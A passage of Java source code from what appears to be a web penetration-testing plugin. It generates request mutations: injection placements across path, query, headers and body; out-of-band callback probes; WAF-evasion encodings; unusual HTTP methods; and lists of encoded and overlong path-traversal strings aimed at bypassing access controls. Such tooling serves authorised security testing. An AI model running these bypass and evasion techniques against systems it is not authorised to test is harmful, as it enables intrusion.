                        pathValue = parent + payload + ctx.origQuery;
                        tag = "InfPATH=";
                        where = "replacing the last path segment";
                        break;
                    default: // APPEND
                        pathValue = ctx.baseClean + payload + ctx.origQuery;
                        tag = "InfPATH+";
                        where = "appended to the last path segment";
                        break;
                }
                addInferPath(techs, display, payload, pathValue, tag + " " + op, where);
            }
            // Root path: payload placed at root.
            addInferPath(techs, display, payload,
                "/" + payload + ctx.origQuery,
                "InfROOT", "placed at the root path");

            // Query-value surface: APPEND / PREPEND / REPLACE on an existing param.
            String qkey = firstExistingQueryKey(ctx.origQuery);
            if (qkey != null) {
                addInferPath(techs, display, payload,
                    ctx.baseClean + "?" + rebuildQueryWithValue(ctx.origQuery, qkey, payload, true),
                    "InfQVA", "appended to the value of query parameter \"" + qkey + "\"");
                addInferPath(techs, display, payload,
                    ctx.baseClean + "?" + rebuildQueryWithPrepend(ctx.origQuery, qkey, payload),
                    "InfQVP", "prepended to the value of query parameter \"" + qkey + "\"");
                addInferPath(techs, display, payload,
                    ctx.baseClean + "?" + rebuildQueryWithValue(ctx.origQuery, qkey, payload, false),
                    "InfQVR", "replacing the value of query parameter \"" + qkey + "\"");
            }

            // Header surfaces: APPEND / PREPEND / REPLACE per value.
            for (String op : new String[]{"APPEND", "PREPEND", "REPLACE"}) {
                addInferHeader(techs, display, payload, "User-Agent", baseMsg, op);
                addInferHeader(techs, display, payload, "Referer", baseMsg, op);
                addInferHeader(techs, display, payload, "X-Forwarded-For", baseMsg, op);
                addInferHeader(techs, display, payload, "Cookie", baseMsg, op);
            }

            // Body-value surfaces: only when the captured request actually has a body,
            // and only appending/replacing/prepending to the value of a real key.
            for (BodyParams.Param prm : bodyParams) {
                addInferBodyTech(techs, display, payload, prm, "APPEND", bodyCt);
                addInferBodyTech(techs, display, payload, prm, "REPLACE", bodyCt);
                addInferBodyTech(techs, display, payload, prm, "PREPEND", bodyCt);
            }
        }
    }

    /** First key that actually exists in a query string (without inventing a fallback),
     *  or {@code null} when the query has no parameter at all. */
    private static String firstExistingQueryKey(String queryWithQ) {
        String s = queryWithQ;
        if (s != null) {
            int q = s.indexOf('?');
            if (q >= 0) s = s.substring(q + 1);
            if (s != null && !s.isEmpty()) {
                for (String pair : s.split("&")) {
                    int eq = pair.indexOf('=');
                    if (eq > 0) {
                        String k = pair.substring(0, eq);
                        if (!k.isEmpty()) return k;
                    }
                }
            }
        }
        return null;
    }

    private void addInferPath(List<Technique> techs, String display, String payload,
            String literalWithQuery, String tag, String where) {
        final String literal = literalWithQuery;
        final String pl = payload;
        Technique t = new Technique("Inference", tag + " " + display,
            "Inference: problematic character " + display + " (" + pl + ") " + where
                + " — sent verbatim on the raw wire to preserve the exact bytes",
            base -> {
                HttpMessage c = base.cloneAll();
                replacePath(c, literal);
                setLiteralPath(c, literal);
                return c;
            });
        t.setNeedsRawWire(true);
        techs.add(t);
    }

    private void addInferHeader(List<Technique> techs, String display, String payload,
            String headerName, HttpMessage baseMsg, String op) {
        final String pl = payload;
        final String hdr = headerName;
        final String mode = op;
        String opLower = op.toLowerCase();

        // Baseline: if header absent or single value, apply the operation to the whole value.
        Technique t = new Technique("Inference", "HDR " + headerName + " " + op + " " + display,
            "Inference: problematic character " + display + " (" + pl + ") " + opLower
                + "ed to the " + headerName + " request header",
            base -> {
                HttpMessage c = base.cloneAll();
                String raw = c.getRequestHeader().getHeader(hdr);
                if (raw == null || raw.isEmpty()) {
                    c.getRequestHeader().setHeader(hdr, applyInferOp("", pl, mode));
                    return c;
                }
                String[] values = parseSemicolonValues(raw);
                if (values.length <= 1) {
                    c.getRequestHeader().setHeader(hdr, applyInferOp(raw, pl, mode));
                    return c;
                }
                // Multi-value baseline: apply op to the last value.
                String rebuilt = "";
                for (int i = 0; i < values.length; i++) {
                    if (i > 0) rebuilt += ";";
                    rebuilt += (i == values.length - 1)
                        ? applyInferOp(values[i], pl, mode) : values[i];
                }
                c.getRequestHeader().setHeader(hdr, rebuilt);
                return c;
            });
        t.setNeedsRawWire(true);
        techs.add(t);

        // Per-value: one technique per semicolon-separated value × operation.
        try {
            String raw = baseMsg.getRequestHeader().getHeader(headerName);
            if (raw != null && !raw.isEmpty()) {
                String[] values = parseSemicolonValues(raw);
                if (values.length > 1) {
                    for (int idx = 0; idx < values.length; idx++) {
                        final int targetIdx = idx;
                        final String tokenPreview = values[idx];
                        final int count = values.length;
                        Technique tVal = new Technique("Inference",
                            "HDR" + headerName + "[" + idx + "] " + op + " " + display,
                            "Inference: problematic character " + display + " (" + pl
                                + ") " + opLower + "ed to value #" + (idx + 1) + " (\""
                                + tokenPreview + "\") of the " + headerName + " header"
                                + " (" + count + " semicolon-separated values)",
                            base2 -> {
                                HttpMessage c2 = base2.cloneAll();
                                String raw2 = c2.getRequestHeader().getHeader(hdr);
                                if (raw2 == null || raw2.isEmpty()) {
                                    c2.getRequestHeader().setHeader(hdr,
                                        applyInferOp("", pl, mode));
                                    return c2;
                                }
                                String[] toks = parseSemicolonValues(raw2);
                                if (targetIdx >= toks.length) {
                                    c2.getRequestHeader().setHeader(hdr,
                                        applyInferOp(raw2, pl, mode));
                                    return c2;
                                }
                                String rebuilt2 = "";
                                for (int i = 0; i < toks.length; i++) {
                                    if (i > 0) rebuilt2 += ";";
                                    rebuilt2 += (i == targetIdx)
                                        ? applyInferOp(toks[i], pl, mode) : toks[i];
                                }
                                c2.getRequestHeader().setHeader(hdr, rebuilt2);
                                return c2;
                            });
                        tVal.setNeedsRawWire(true);
                        techs.add(tVal);
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    /** Apply an inference operation to a single header value token. */
    private static String applyInferOp(String value, String payload, String mode) {
        switch (mode) {
            case "PREPEND": return payload + value;
            case "REPLACE": return payload;
            case "APPEND":
            default:        return value + payload;
        }
    }

    /** Split a header value on ";" and trim each token. */
    private static String[] parseSemicolonValues(String raw) {
        String[] parts = raw.split(";");
        for (int i = 0; i < parts.length; i++) parts[i] = parts[i].trim();
        return parts;
    }

    private void addInferBodyTech(List<Technique> techs, String display, String payload,
            BodyParams.Param p, String op, String ct) {
        final String pl = payload;
        final BodyParams.Param target = p;
        final String mode = op;
        Technique t = new Technique("Inference", "BODY " + op + " " + p.name + " " + display,
            "Inference: problematic character " + display + " (" + pl + ") " + op.toLowerCase()
                + "d to the value of body parameter \"" + p.name + "\""
                + " (kind " + p.kind + ", content-type " + (ct.isEmpty() ? "none" : ct) + ")",
            base -> {
                HttpMessage c = base.cloneAll();
                String next = BodyParams.rewrite(c, target, pl, mode);
                if (next == null) return null;
                c.setRequestBody(next);
                c.getRequestHeader().setContentLength(next.length());
                return c;
            });
        t.setNeedsRawWire(true);
        techs.add(t);
    }

    // ─── 0b. Vulnerability-class techniques (classic / rare / novel) ─────

    /**
     * Expands the vulnerability-type catalog through the shared placement engine:
     * each tiered payload is dropped at header, every path segment, root path,
     * root query and query-value placements, so every vulnerability type has an
     * effective injection point.
     */
    private void buildVulnClassTechniques(List<Technique> techs, PathContext ctx) {
        String qkey = firstQueryKey(ctx.origQuery, "q");
        int segCount = ctx.rawSegments.length;
        for (VulnCatalog.VulnClass vc : VulnCatalog.getClasses()) {
            for (VulnCatalog.Payload pl : vc.getPayloads()) {
                String payload = pl.getPayload();
                VulnCatalog.Tier tier = pl.getTier();
                techs.add(vulnTech(vc, tier, payload, "HDR", 0, qkey,
                    "payload appended to the " + vc.getDefaultHeader() + " request header"));
                techs.add(vulnTech(vc, tier, payload, "UA", 0, qkey,
                    "payload appended to the User-Agent request header"));
                for (int i = 0; i < segCount; i++) {
                    techs.add(vulnTech(vc, tier, payload, "SEG+", i, qkey,
                        "payload appended after path segment " + (i + 1) + " of " + segCount));
                }
                if (tier == VulnCatalog.Tier.NOVEL) {
                    for (int i = 0; i < segCount; i++) {
                        techs.add(vulnTech(vc, tier, payload, "SEG-", i, qkey,
                            "payload prepended before path segment " + (i + 1) + " of " + segCount));
                    }
                    techs.add(vulnTech(vc, tier, payload, "QAPP", -1, qkey,
                        "payload appended to the value of query parameter \"" + qkey + "\""));
                }
                techs.add(vulnTech(vc, tier, payload, "ROOT-P", -1, qkey,
                    "payload placed at root path (original path removed)"));
                techs.add(vulnTech(vc, tier, payload, "ROOT-Q", -1, qkey,
                    "payload placed as root query (original path removed)"));
                techs.add(vulnTech(vc, tier, payload, "QREP", -1, qkey,
                    "payload replaces the value of query parameter \"" + qkey + "\""));
            }
        }
    }

    private Technique vulnTech(VulnCatalog.VulnClass vc, VulnCatalog.Tier tier, String payload,
            String placement, int position, String queryKey, String descTail) {
        String tag = VulnCatalog.placementTag(placement, position);
        String shortPayload = payload.length() <= 30 ? payload : payload.substring(0, 30);
        String label = VulnCatalog.tierName(tier) + " " + tag + " | " + shortPayload;
        String desc = vc.getFamily() + " (" + VulnCatalog.tierName(tier).toLowerCase(java.util.Locale.ROOT)
            + "): " + descTail + " — payload: " + payload;
        final String pl = payload;
        Technique t = new Technique(vc.getFamily(), label, desc, base -> {
            HttpMessage c = base.cloneAll();
            applyVulnPlacement(c, pl, placement, position, queryKey, vc.getDefaultHeader());
            return c;
        });
        t.setTier(tier);
        return t;
    }

    // ─── 0b2. Out-of-band (OOB) callback probes ─────────────────────────

    /**
     * When the user has configured an OOB callback URL (e.g. Burp Collaborator or
     * Interactsh), drops each applicable class's OOB template — with the {@code {{OOB}}}
     * placeholder replaced by the configured URL — through the shared placement
     * engine at the header, User-Agent, query-value and root-query spots. A callback
     * hit on the collaborator proves server-side interpretation of the payload:
     * command execution, SSRF, XXE (external DTD), Log4Shell JNDI lookup, and so on.
     */
    private void buildOobTechniques(List<Technique> techs, PathContext ctx) {
        String oobUrl = (this.oobUrl != null) ? this.oobUrl : VulnCatalog.getOobUrl();
        if (oobUrl.isEmpty()) return;
        String qkey = firstQueryKey(ctx.origQuery, "q");
        for (VulnCatalog.VulnClass vc : VulnCatalog.getClasses()) {
            List<VulnCatalog.Payload> oob = vc.getOob();
            if (oob == null || oob.isEmpty()) continue;
            for (VulnCatalog.Payload pl : oob) {
                String payload = pl.getPayload().replace("{{OOB}}", oobUrl);
                if (payload.equals(pl.getPayload())) continue;
                VulnCatalog.Tier tier = pl.getTier();
                techs.add(vulnTech(vc, tier, payload, "HDR", 0, qkey,
                    "OOB probe: payload appended to the " + vc.getDefaultHeader() + " request header"));
                techs.add(vulnTech(vc, tier, payload, "UA", 0, qkey,
                    "OOB probe: payload appended to the User-Agent request header"));
                techs.add(vulnTech(vc, tier, payload, "QREP", -1, qkey,
                    "OOB probe: payload replaces the value of query parameter \"" + qkey + "\""));
                techs.add(vulnTech(vc, tier, payload, "ROOT-Q", -1, qkey,
                    "OOB probe: payload placed as root query (original path removed)"));
            }
        }
    }

    // ─── 0c. WAF-encoding variants (Recode-style payload encoders) ───────

    /**
     * Expands every vulnerability-catalog payload into WAF-evasion variants using
     * the Recode-style encoders (URL x1/x2/x3, Base64, Base64 URL, ASCII hex, HTML
     * numeric entities, overlong UTF-8). The encoded payload is dropped through the
     * same placement engine at the plain headers and the persisted query value
     * (the two spots that reach the app as typed, so the WAF-that-decodes-once
     * vs app-that-decodes-twice differential stays intact).
     */
    private void buildWafEncodeTechniques(List<Technique> techs, PathContext ctx) {
        String qkey = firstQueryKey(ctx.origQuery, "q");
        for (VulnCatalog.VulnClass vc : VulnCatalog.getClasses()) {
            String headerName = vc.getDefaultHeader();
            for (VulnCatalog.Payload pl : vc.getPayloads()) {
                String raw = pl.getPayload();
                VulnCatalog.Tier tier = pl.getTier();
                addWafEnc(techs, vc, raw, tier, PayloadEncoder.Encoder.URL1,
                    new String[]{"HDR", "QREP", "UA"}, qkey, headerName);
                addWafEnc(techs, vc, raw, tier, PayloadEncoder.Encoder.URL2,
                    new String[]{"QREP"}, qkey, headerName);
                addWafEnc(techs, vc, raw, tier, PayloadEncoder.Encoder.URL3,
                    new String[]{"QREP"}, qkey, headerName);
                addWafEnc(techs, vc, raw, tier, PayloadEncoder.Encoder.B64,
                    new String[]{"QREP"}, qkey, headerName);
                addWafEnc(techs, vc, raw, tier, PayloadEncoder.Encoder.B64U,
                    new String[]{"QREP"}, qkey, headerName);
                addWafEnc(techs, vc, raw, tier, PayloadEncoder.Encoder.HEX,
                    new String[]{"QREP"}, qkey, headerName);
                addWafEnc(techs, vc, raw, tier, PayloadEncoder.Encoder.HTML,
                    new String[]{"QREP"}, qkey, headerName);
                addWafEnc(techs, vc, raw, tier, PayloadEncoder.Encoder.OVERLONG,
                    new String[]{"QREP"}, qkey, headerName);
            }
        }
    }

    private void addWafEnc(List<Technique> techs, VulnCatalog.VulnClass vc, String raw,
            VulnCatalog.Tier tier, PayloadEncoder.Encoder enc, String[] placements,
            String qkey, String headerName) {
        String encoded = PayloadEncoder.encode(raw, enc);
        String shortEnc = encoded.length() <= 40 ? encoded : encoded.substring(0, 40);
        for (String placement : placements) {
            String label = "Waf" + enc.code() + " " + placement + " | " + shortEnc;
            String desc = vc.getFamily() + " WAF-encoded (" + enc.getDisplay() + "): payload \""
                + raw + "\" encoded to \"" + encoded + "\", "
                + ("HDR".equals(placement)
                    ? "appended to the " + headerName + " request header"
                    : "placed in query parameter \"" + qkey + "\"");
            final String pl = placement;
            final String payload = encoded;
            final String qk = qkey;
            final String hdr = headerName;
            final Technique tech = new Technique("WAF Encoding", label, desc, base -> {
                HttpMessage c = base.cloneAll();
                applyVulnPlacement(c, payload, pl, 0, qk, hdr);
                if ("QREP".equals(pl)) {
                    // Mark the literal wire target so RawHttpSender writes the exact
                    // percent-encoding layers (URI.setPath/setQuery would otherwise
                    // re-escape the '%' and shift the ladder by one).
                    PathContext pc = new PathContext(c);
                    String newQ = rebuildQueryWithValue(pc.origQuery, qk, payload, false);
                    setLiteralPath(c, pc.basePath + "?" + newQ);
                }
                return c;
            });
            tech.setTier(tier);
            if (!"HDR".equals(placement)) tech.setNeedsRawWire(true);
            techs.add(tech);
        }
    }

    // ─── 0d. Body-parameter variants (any Content-Type) ──────────────────

    /**
     * Expands every vulnerability-catalog payload against each detected request-body
     * parameter, regardless of Content-Type: form-urlencoded field values, multipart
     * part values, JSON leaf values (objects/arrays), XML leaf element text, and an
     * opaque whole-body parameter for anything else. For every value the payload is
     * REPLACEd in, APPENDed after, and PREPENDed before it; the novel tier additionally
     * injects a brand-new parameter where the format can carry one.
     */
    private void buildBodyParamTechniques(List<Technique> techs, HttpMessage baseMsg) {
        List<BodyParams.Param> params;
        try {
            params = BodyParams.extract(baseMsg);
        } catch (Exception e) {
            return;
        }
        if (params.isEmpty()) return;
        String ct = BodyParams.contentType(baseMsg);
        for (VulnCatalog.VulnClass vc : VulnCatalog.getClasses()) {
            for (VulnCatalog.Payload pl : vc.getPayloads()) {
                String payload = pl.getPayload();
                VulnCatalog.Tier tier = pl.getTier();
                for (BodyParams.Param p : params) {
                    addBodyParamTech(techs, vc, tier, payload, p, "REPLACE", ct);
                    addBodyParamTech(techs, vc, tier, payload, p, "APPEND", ct);
                    addBodyParamTech(techs, vc, tier, payload, p, "PREPEND", ct);
                    if (tier == VulnCatalog.Tier.NOVEL && BodyParams.canInject(p)) {
                        addBodyParamTech(techs, vc, tier, payload, p, "INJECT", ct);
                    }
                }
            }
        }
    }

    private void addBodyParamTech(List<Technique> techs, VulnCatalog.VulnClass vc,
            VulnCatalog.Tier tier, String payload, BodyParams.Param p, String op, String ct) {
        String shortPayload = payload.length() <= 30 ? payload : payload.substring(0, 30);
        String label = VulnCatalog.tierName(tier) + " BP" + op.charAt(0) + " " + p.name
            + " | " + shortPayload;
        String desc = vc.getFamily() + " (" + VulnCatalog.tierName(tier).toLowerCase(java.util.Locale.ROOT)
            + "): " + op.toLowerCase() + " value of body parameter \"" + p.name + "\""
            + " (kind " + p.kind + ", content-type " + (ct.isEmpty() ? "none" : ct) + ")"
            + " — payload: " + payload;
        final BodyParams.Param target = p;
        final String mode = op;
        techs.add(new Technique("Body Params", label, desc, base -> {
            HttpMessage c = base.cloneAll();
            String next = BodyParams.rewrite(c, target, payload, mode);
            if (next == null) next = "";
            c.setRequestBody(next);
            c.getRequestHeader().setContentLength(next.length());
            return c;
        }));
    }

    // ─── 1. HTTP Methods ────────────────────────────────────────────────

    private void buildMethodTechniques(List<Technique> techs, HttpMessage baseMsg,
            BiConsumer<HttpMessage, String> setPath, PathContext ctx) {
        String origMethod = baseMsg.getRequestHeader().getMethod();

        // Classic methods that typically allow body
        String[] bodyMethods = {"POST", "PUT", "PATCH"};
        for (String m : bodyMethods) {
            if (m.equals(origMethod)) continue;
            String method = m;
            techs.add(new Technique("Methods", "Method:" + m,
                "Send request with HTTP method " + m + " (allows body) instead of " + origMethod,
                base -> { HttpMessage c = cloneMsg(base); setMethod(c, method); return c; }));
        }

        // Classic methods
        String[] classicMethods = {"GET", "DELETE", "HEAD", "OPTIONS"};
        for (String m : classicMethods) {
            if (m.equals(origMethod)) continue;
            String method = m;
            techs.add(new Technique("Methods", "Method:" + m,
                "Send request with HTTP method " + m + " instead of " + origMethod,
                base -> { HttpMessage c = cloneMsg(base); setMethod(c, method); return c; }));
        }

        // Rare/WebDAV methods
        String[] rareMethods = {"CONNECT", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE",
            "LOCK", "UNLOCK", "REPORT", "VIEW", "CHECKOUT", "UNCHECKOUT", "SEARCH",
            "BULK", "ACL", "BASELINE-CONTROL", "VERSION-CONTROL", "LINK", "UNLINK"};
        for (String m : rareMethods) {
            if (m.equals(origMethod)) continue;
            String method = m;
            techs.add(new Technique("Methods", "MethodRare:" + m,
                "Send request with WebDAV/rare HTTP method " + m,
                base -> { HttpMessage c = cloneMsg(base); setMethod(c, method); return c; }));
        }

        // Novel methods with method-body combinations for bypass
        // Some servers route based on method BEFORE validating body existence
        String[][] novelMethodBody = {
            {"GET", "POST body after GET (route confusion)"},
            {"HEAD", "POST body with HEAD (mixed semantics)"},
            {"OPTIONS", "POST body with OPTIONS (CORS bypass attempt)"},
            {"DELETE", "POST body after DELETE"},
            {"TRACE", "POST body with TRACE (XST attempt)"},
            {"GET", "PUT body (method-body confusion)"},
        };
        for (String[] mb : novelMethodBody) {
            if (mb[0].equals(origMethod)) continue;
            String method = mb[0];
            techs.add(new Technique("Methods", "MethodNovel:" + mb[0],
                mb[1],
                base -> { HttpMessage c = cloneMsg(base); setMethod(c, method); return c; }));
        }

        // HTTP/2 pseudo-methods and method with whitespace (rare - servers may not normalize)
        String[] extraMethods = {"GET ", "GET%20", "GET\t", "POST ", "POST%20",
            "PUT ", "DELETE ", "PATCH ", "OPTIONS ", "TRACE "};
        for (String m : extraMethods) {
            if (m.trim().equals(origMethod)) continue;
            String method = m;
            Technique methodSpaceTech = new Technique("Methods",
                "MethodSpace:" + m.replace(" ","_").replace("\t","TAB"),
                "Method with trailing whitespace: '" + m + "'",
                base -> { HttpMessage c = cloneMsg(base); setMethod(c, method); return c; });
            methodSpaceTech.setNeedsRawWire(true);
            techs.add(methodSpaceTech);
        }
    }

    // ─── 2. Whole-path case variation ───────────────────────────────────

    private void buildCaseTechniques(List<Technique> techs,
            BiConsumer<HttpMessage, String> setPath, PathContext ctx) {
        Set<String> seenCase = new LinkedHashSet<>(8);
        seenCase.add(ctx.baseClean.toLowerCase());
        seenCase.add(ctx.baseClean.toUpperCase());
        // Title case: first char of each segment upper, rest lower
        StringBuilder titleSb = new StringBuilder(ctx.baseClean.length());
        boolean afterSlash = true;
        for (int i = 0; i < ctx.baseClean.length(); i++) {
            char c = ctx.baseClean.charAt(i);
            if (c == '/') { afterSlash = true; titleSb.append(c); }
            else if (afterSlash) { titleSb.append(Character.toUpperCase(c)); afterSlash = false; }
            else { titleSb.append(Character.toLowerCase(c)); }
        }
        seenCase.add(titleSb.toString());
        // Alternating case per segment: aDmIn
        StringBuilder altSb = new StringBuilder(ctx.baseClean.length());
        int segIdx = 0;
        for (int i = 0; i < ctx.baseClean.length(); i++) {
            char c = ctx.baseClean.charAt(i);
            if (c == '/') { segIdx = 0; altSb.append(c); }
            else { altSb.append(segIdx % 2 == 0 ? Character.toUpperCase(c) : Character.toLowerCase(c)); segIdx++; }
        }
        seenCase.add(altSb.toString());
        // Inverse alternating: AdMiN
        StringBuilder invAltSb = new StringBuilder(ctx.baseClean.length());
        segIdx = 0;
        for (int i = 0; i < ctx.baseClean.length(); i++) {
            char c = ctx.baseClean.charAt(i);
            if (c == '/') { segIdx = 0; invAltSb.append(c); }
            else { invAltSb.append(segIdx % 2 == 0 ? Character.toLowerCase(c) : Character.toUpperCase(c)); segIdx++; }
        }
        seenCase.add(invAltSb.toString());
        for (String cp : seenCase) {
            String path = cp;
            techs.add(new Technique("Case", "Case:" + cp,
                "Change entire path case to: " + cp,
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, path); return c; }));
        }
    }

    // ─── 3. Per-segment mutations ───────────────────────────────────────

    private void buildSegmentCaseTechniques(List<Technique> techs,
            BiConsumer<HttpMessage, String> setPath, PathContext ctx) {
        for (int si = 0; si < ctx.rawSegments.length; si++) {
            final int idx = si;
            final String sg = ctx.rawSegments[si];
            String up = sg.toUpperCase(), lo = sg.toLowerCase();
            if (!up.equals(sg)) {
                final String val = up;
                techs.add(new Technique("SegmentCase", "SegUpper:" + sg,
                    "Uppercase segment [" + idx + "]: " + sg + " -> " + up,
                    base -> { HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone(); s[idx] = val; setPath.accept(c, joinPath(s)); return c; }));
            }
            if (!lo.equals(sg)) {
                final String val = lo;
                techs.add(new Technique("SegmentCase", "SegLower:" + sg,
                    "Lowercase segment [" + idx + "]: " + sg + " -> " + lo,
                    base -> { HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone(); s[idx] = val; setPath.accept(c, joinPath(s)); return c; }));
            }
            for (int li = 0; li < sg.length(); li++) {
                final int pos = li;
                char ch = sg.charAt(pos);
                char flipped = (ch == Character.toUpperCase(ch)) ? Character.toLowerCase(ch) : Character.toUpperCase(ch);
                if (flipped != ch) {
                    techs.add(new Technique("SegmentLetter", "SegLetter:" + sg + "@" + pos,
                        "Flip case of char at position " + pos + " in segment [" + idx + "]",
                        base -> {
                            HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                            String seg = s[idx]; s[idx] = seg.substring(0, pos) + Character.toUpperCase(seg.charAt(pos)) + seg.substring(pos + 1);
                            setPath.accept(c, joinPath(s)); return c; }));
                }
            }
            for (String mc : mixedCase(sg)) {
                if (mc.equals(sg)) continue;
                final String val = mc;
                techs.add(new Technique("SegmentMix", "SegMix:" + sg + "=" + mc,
                    "Mixed-case variant of segment [" + idx + "]: " + sg + " -> " + mc,
                    base -> { HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone(); s[idx] = val; setPath.accept(c, joinPath(s)); return c; }));
            }
        }
    }

    // ─── 4. Trailing dot on segments ────────────────────────────────────

    private void buildSegmentDotTechniques(List<Technique> techs,
            BiConsumer<HttpMessage, String> setPath, PathContext ctx) {
        for (int si = 0; si < ctx.rawSegments.length; si++) {
            final int idx = si;
            final String sg = ctx.rawSegments[si];
            techs.add(new Technique("SegmentDot", "SegDot:" + sg,
                "Append trailing dot to segment [" + idx + "] (path-param / Windows 8.3)",
                base -> { HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone(); s[idx] = sg + "."; setPath.accept(c, joinPath(s)); return c; }));
        }
    }

    // ─── 5. Trailing suffix mutations ───────────────────────────────────

    private void buildSuffixTechniques(List<Technique> techs,
            BiConsumer<HttpMessage, String> setPath, PathContext ctx) {
        // Removed: %00, raw \t, raw \\, ..; etc. that cause 400 Bad Request
        // Only well-formed URL-encodable suffixes remain
        String[] suffixVariants = {".","/","//","./",";","#","?","%20","%09",
            "%23","%3f","%3b","%2e","..","/.","%5c",
            "%0d","%0a","~","~0","~1","~01","~10","%21","%7e",
            "..%2e","%23%23","%3f%3f"};
        for (String suf : suffixVariants) {
            final String s = suf;
            techs.add(new Technique("Suffix", "Suffix:" + suf,
                "Append suffix '" + suf + "' to path",
                base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, ctx.baseClean + s); return c; }));
        }
    }

    // ─── 6. Path traversal / dot-segment ────────────────────────────────

    private void buildTraversalTechniques(List<Technique> techs,
            BiConsumer<HttpMessage, String> setPath, PathContext ctx) {
        // Classic: basic traversal variants
        String[] classicTraversal = {"..","../","....",".","%2e%2e","%2e%2e/"};
        for (String tp : classicTraversal) {
            final String p = tp;
            techs.add(new Technique("Traversal", "TravPre:" + tp.replace("%", "P"),
                "Prepend traversal '" + p + "' before path",
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, "/" + p + stripLeadingSlash(ctx.baseClean)); return c; }));
            techs.add(new Technique("Traversal", "TravApp:" + tp.replace("%", "P"),
                "Append traversal '" + p + "' after last segment",
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, ctx.parent + p + ctx.lastSeg); return c; }));
        }

        // Classic: dot-segment normalization
        String[] dotSeg = {".","..","./","././","./..","../"};
        for (String tp : dotSeg) {
            final String p = tp;
            techs.add(new Technique("Traversal", "TravDot:" + tp.replace("/", "S"),
                "Append dot-segment '" + p + "' to path",
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, ctx.baseClean + "/" + p); return c; }));
        }

        // Rare: URL-encoded traversal variants
        String[] rareTraversal = {
            "%2e%2e%2f","%2e%2e%5c",  // Single encoded
            "%252e%252e%252f","%252e%252e%255c",  // Double encoded
            "%2e%2e/","%2e%2e\\",  // Encoded with separator
            ".%2e","..%2e",  // Partial encoding
            "%2e.","%2e..",  // Trailing dot encoding
        };
        for (String tp : rareTraversal) {
            final String p = tp;
            techs.add(new Technique("Traversal", "TravEnc:" + tp.replace("%", "P"),
                "Encoded traversal: " + p,
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, ctx.parent + p + ctx.lastSeg); return c; }));
            techs.add(new Technique("Traversal", "TravEncPre:" + tp.replace("%", "P"),
                "Encoded traversal prepended: " + p,
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, "/" + p + stripLeadingSlash(ctx.baseClean)); return c; }));
        }

        // Rare: Overlong UTF-8 traversal
        String[] overlongTraversal = {
            "%c0%ae%c0%ae%2f",  // .. encoded as 2-byte overlong
            "%c0%ae%c0%ae%5c",  // ..\ encoded as 2-byte overlong
            "%c0%ae%2e%2f",  // .%2f with overlong
            "%e0%80%ae%e0%80%ae%2f",  // 3-byte overlong
        };
        for (String tp : overlongTraversal) {
            final String p = tp;
            techs.add(new Technique("Traversal", "TravOL:" + tp.replace("%", "P"),
                "Overlong UTF-8 traversal: " + p,
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, ctx.parent + p + ctx.lastSeg); return c; }));
        }

        // Novel: Traversal with path confusion
        for (int ti = 1; ti < ctx.rawSegments.length; ti++) {
            final int depth = ti;
            techs.add(new Technique("Traversal", "TravInject:" + depth,
                "Inject '../' before segment [" + depth + "]",
                base -> {
                    List<String> seg = new ArrayList<>();
                    for (int q = 0; q < ctx.rawSegments.length; q++) {
                        if (q == depth) seg.add("../");
                        seg.add(ctx.rawSegments[q]);
                    }
                    HttpMessage c = cloneMsg(base); setPath.accept(c, joinPath(seg)); return c; }));
        }

        // Novel: Traversal with semicolon (Tomcat/Wildfly confusion)
        String[] novelTravSemi = {
            "..;/",  // Traversal + semicolon
            "../;",  // Reversed
            "..%3b/",  // Encoded semicolon
            "..;./",  // Triple dot
            ";../",  // Semicolon prefix
            ";/..",  // Semicolon suffix
        };
        for (String tp : novelTravSemi) {
            final String p = tp;
            techs.add(new Technique("Traversal", "TravSemi:" + tp.replace("%", "P").replace(";", "SC"),
                "Traversal with semicolon: " + p,
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, ctx.parent + p + ctx.lastSeg); return c; }));
        }

        // Novel: Double traversal (testing double-decode)
        String[] novelDouble = {
            "..%252f",  // %25 = %, %2f = /
            "..%255c",  // %25 = %, %5c = \
            "%2e%2e%252f",  // Double encode
            "..%c0%af",  // Overlong + decode
        };
        for (String tp : novelDouble) {
            final String p = tp;
            techs.add(new Technique("Traversal", "TravDbl:" + tp.replace("%", "P"),
                "Double-encoded traversal: " + p,
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, ctx.parent + p + ctx.lastSeg); return c; }));
        }
    }

    // ─── 7. Encoded path variants ───────────────────────────────────────

    private void buildEncodingTechniques(List<Technique> techs,
            BiConsumer<HttpMessage, String> setPath, PathContext ctx) {
        String[] encPayloads = {"%2f","%5c","\\","%252f","%255c","%c0%af","%c0%ae",
            "%c0%ae%c0%ae%c0%af","%u2215","%u2216","%u002e","%e2%80%ae",
            "%2e%2e%2f","%252e%252e%252f","..%2f","..%5c","%2e%2e%5c",
            "%c0%ae%c0%ae%2f","..%c0%af","%25","%2525"};
        for (String ep : encPayloads) {
            final String p = ep;
            techs.add(new Technique("Encoding", "EncWhole:" + ep,
                "Append encoded payload '" + ep + "' to path",
                base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, ctx.baseClean + p); return c; }));
        }
        for (int ei = 0; ei < ctx.rawSegments.length; ei++) {
            final int ix = ei;
            final String sg = ctx.rawSegments[ei];
            for (int ci = 0; ci < sg.length(); ci++) {
                final int pos = ci;
                if (sg.charAt(pos) == '%') continue;
                String hex = "%" + Integer.toHexString(sg.charAt(pos)).toUpperCase();
                techs.add(new Technique("Encoding", "SegEncP:" + sg.charAt(pos) + "@" + pos,
                    "Percent-encode char at position " + pos + " in segment [" + ix + "]",
                    base -> {
                        HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                        String cs = s[ix]; s[ix] = cs.substring(0, pos) + hex + cs.substring(pos + 1);
